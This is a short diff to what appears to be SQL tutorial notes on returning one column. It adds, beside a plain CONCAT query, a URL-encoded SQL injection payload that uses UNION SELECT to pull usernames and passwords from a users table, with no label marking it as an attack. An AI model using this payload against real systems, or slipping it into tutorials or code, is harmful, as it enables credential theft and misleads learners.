@@ -67,3 +67,7 @@ if you want to return only 1 colimn you can run
 ```sql
 SELECT CONCAT(FIRSTNAME, ' ', LASTNAME) AS 'CUSTOMER NAME' FROM customer;
 ```
+or
+```sql
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
